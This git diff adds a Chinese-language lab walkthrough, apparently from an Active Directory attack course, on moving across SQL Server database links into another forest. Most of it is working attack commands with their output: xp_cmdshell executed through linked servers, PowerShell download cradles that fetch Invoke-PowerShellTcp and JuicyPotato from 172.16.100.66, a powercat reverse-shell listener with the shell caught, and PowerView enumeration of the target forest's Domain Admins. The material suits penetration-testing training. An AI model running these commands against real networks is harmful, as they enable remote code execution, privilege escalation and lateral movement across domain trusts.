@@ -2574,7 +2574,229 @@ ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 Task
 ● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
 
+## 原理
+微软的SQL 服务通常部署在一个 Windows 域中
+SQL Servers为横向移动提供了非常好的选项，因为域用户可以映射到数据库角色
+数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
+如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效
+
+枚举当前账号是否对MSSQLSERVER有权限，收集信息
+```
+PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
+WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
+ less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
+parameter. For a list of approved verbs, type Get-Verb.
+PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1724
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 14.0.1000.169
+SQLServerMajorVersion  : 2017
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student366
+IsSysadmin             : No
+ActiveSessions         : 1
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1724
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 14.0.1000.169
+SQLServerMajorVersion  : 2017
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student366
+IsSysadmin             : No
+ActiveSessions         : 1
+```
+
+或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
+
+
+ComputerName                           Instance                                    Status
+------------                           --------                                    ------
+dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
+dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
+```
+
+只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible
+
+手动枚举mssql链接
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+
+Version     : SQL Server 2017
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery :
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```
+
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
+```
+
+执行
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
+
+
+Version     : SQL Server 2017
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery : {nt authority\network service, }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+在最后一组的CustomQuery里打印出了whoami命令的执行结果：```nt authority\network service```
+
+下面命令触发一个反弹shell
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
+```
+
+收到反弹shell
+```
+PS C:\ad> . .\powercat.ps1
+PS C:\ad> powercat -l -v -p 443 -t 100
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [172.16.15.17] port  [tcp] accepted (source port 50292)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+
+Windows PowerShell running as user EU-SQL$ on EU-SQL
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>PS C:\Windows\system32> whoami
+nt authority\network service
+PS C:\Windows\system32> hostname
+eu-sql
+```
 
 
 
+iex (iwr http://172.16.100.66/JuicyPotato.ps1 -UseBasicParsing)
 
+iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
+
+iex (iwr http://172.16.100.66/PowerView_dev.ps1 -UseBasicParsing)
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.100.66/JuicyPotato.exe','C:\users\public\downloads\JuicyPotato.exe')"
+
+
+powershell -c .\JuicyPotato.exe -l 4433 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1')" -t *
+
+
+$data = (New-Object System.Net.WebClient).DownloadData('http://172.16.100.66/JuicyPotato.exe')
+$assem = [System.Reflection.Assembly]::load($data)
+[rev.Program]::Main()
+
+
+枚举eurocorp.local里面的所有域
+```
+PS C:\users\public\Downloads> Get-NetForestDomain -Forest eurocorp.local
+
+
+Forest                  : eurocorp.local
+DomainControllers       : {eurocorp-dc.eurocorp.local}
+Children                : {eu.eurocorp.local}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  :
+PdcRoleOwner            : eurocorp-dc.eurocorp.local
+RidRoleOwner            : eurocorp-dc.eurocorp.local
+InfrastructureRoleOwner : eurocorp-dc.eurocorp.local
+Name                    : eurocorp.local
+
+Forest                  : eurocorp.local
+DomainControllers       : {eu-dc.eu.eurocorp.local}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : eurocorp.local
+PdcRoleOwner            : eu-dc.eu.eurocorp.local
+RidRoleOwner            : eu-dc.eu.eurocorp.local
+InfrastructureRoleOwner : eu-dc.eu.eurocorp.local
+Name                    : eu.eurocorp.local
+```
+
+枚举eurocorp.local里面的所有用户
+```
+PS C:\users\public\Downloads> get-netuser -domain eurocorp.local|select cn
+
+cn
+--
+Administrator
+Guest
+DefaultAccount
+krbtgt
+```
+
+枚举eurocorp.local里面的所有计算机
+
+```
+PS C:\users\public\Downloads> Get-NetComputer -domain eurocorp.local
+eurocorp-dc.eurocorp.local
+PS C:\users\public\Downloads> Get-NetComputer -domain eu.eurocorp.local
+eu-dc.eu.eurocorp.local
+eu-sql.eu.eurocorp.local
+```
+
+
+枚举eurocorp.local DA管理员
+```
+PS C:\users\public\Downloads> Get-NetGroupMember -GroupName "Domain Admins" -Recurse -domain eu.eurocorp.local
+
+
+GroupDomain  : eu.eurocorp.local
+GroupName    : Domain Admins
+MemberDomain : eu.eurocorp.local
+MemberName   : Administrator
+MemberSID    : S-1-5-21-2745303235-1478049046-1952051811-500
+IsGroup      : False
+MemberDN     : CN=Administrator,CN=Users,DC=eu,DC=eurocorp,DC=local
+```
